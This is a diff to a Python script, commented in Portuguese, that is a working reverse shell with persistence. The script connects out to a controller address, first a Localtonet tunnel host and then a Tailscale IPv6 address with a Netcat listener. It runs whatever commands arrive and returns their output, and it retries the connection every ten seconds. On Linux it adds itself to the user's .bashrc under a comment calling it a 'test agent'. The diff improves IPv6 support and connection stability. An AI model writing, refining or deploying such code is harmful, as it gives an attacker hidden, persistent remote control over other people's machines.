@@ -1,18 +1,18 @@
-import socket
+import socket  # Corrigido para inicial minúscula
 import subprocess
-import threading
 import time
 import os
 import sys
 import platform
 
-# Configuração atualizada do túnel Localtonet
-ccip = "at3xxtumny.localto.net"
-ccport = 8400
+# Configuração atualizada para a rede privada Tailscale em IPv6
+ccip = "fd7a:115c:a1e0::8e01:1aae"  # Seu IPv6 do Tailscale
+ccport = 8080                       # Porta configurada no Netcat
 
 def conn(ccip, ccport):
     try:
-        client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        # Alterado para AF_INET6 para garantir compatibilidade com IPv6
+        client = socket.socket(socket.AF_INET6, socket.SOCK_STREAM)
         client.connect((ccip, ccport))
         return client
     except Exception:
@@ -41,30 +41,27 @@ def autorun():
             
     elif "linux" in sistema:
         try:
-            # Identifica a pasta HOME (funciona na AWS e também no ambiente interno do Termux)
             home = os.environ.get("HOME")
             if home:
-                # No Linux/Termux, uma forma comum de persistência local é o arquivo .bashrc
                 bashrc_path = os.path.join(home, ".bashrc")
-                
-                # Comando que confere se o script já está listado para rodar no .bashrc
                 linha_comando = f"python3 {arquivo_atual} &\n"
                 
-                # Se o arquivo .bashrc existir, verifica se já possui a linha para evitar duplicados
                 ja_existe = False
                 if os.path.exists(bashrc_path):
                     with open(bashrc_path, "r") as f:
                         if arquivo_atual in f.read():
                             ja_existe = True
                 
-                # Se não estiver lá, adiciona ao final do arquivo de inicialização
                 if not ja_existe:
                     with open(bashrc_path, "a") as f:
                         f.write(f"\n# Inicializacao automatica do agente de testes\n{linha_comando}")
         except Exception:
             pass
 
-def cmd(client, data):
+def cmd(data):
+    """
+    Executa o comando no sistema e retorna os dados formatados.
+    """
     try:
         sistema = platform.system().lower()
         
@@ -93,33 +90,40 @@ def cmd(client, data):
         if not output:
             output = "\n"
             
-        resposta = output.encode(encoding_padrao, errors='replace') + prompt.encode(encoding_padrao)
-        client.send(resposta)
+        return output.encode(encoding_padrao, errors='replace') + prompt.encode(encoding_padrao)
         
     except Exception as error:
-        try:
-            client.send(f"Erro ao executar: {str(error)}\n".encode())
-        except:
-            pass
+        return f"Erro ao executar: {str(error)}\n".encode()
 
 def cli(client):
     try:
         sistema = platform.system().lower()
-        msg_boas_vindas = f"Conexao Estabelecida! Sistema: {platform.system()} {platform.release()}\n> "
+        prompt_inicial = "\nCMD> " if "windows" in sistema else "\nshell$ "
+        
+        msg_boas_vindas = f"Conexao Estabelecida! Sistema: {platform.system()} {platform.release()}{prompt_inicial}"
         client.send(msg_boas_vindas.encode('utf-8', errors='ignore'))
         
         while True:
-            data = client.recv(4096).decode('utf-8', errors='ignore').strip()
-            
-            if not data:
+            # Captura os dados brutos recebidos
+            dados_brutos = client.recv(4096)
+            if not dados_brutos:
+                # Se o socket fechar de verdade, encerra o loop
                 break
+                
+            data = dados_brutos.decode('utf-8', errors='ignore').strip()
+            
+            # Se o usuário apenas apertar "Enter", envia o prompt de volta sem quebrar a conexão
+            if len(data) == 0:
+                client.send(prompt_inicial.encode())
+                continue
                 
             if data.lower() == ":kill":
                 client.send(b"Desconectando...\n")
                 break
             
-            t = threading.Thread(target=cmd, args=(client, data))
-            t.start()
+            # Executa de forma sequencial para evitar atropelamento de dados no socket
+            resposta = cmd(data)
+            client.send(resposta)
             
     except Exception:
         pass
@@ -137,4 +141,6 @@ if __name__ == "__main__":
         if client:
             cli(client)
         else:
+            # Aguarda 10 segundos antes de tentar reconectar caso o ouvinte caia
             time.sleep(10)
+    
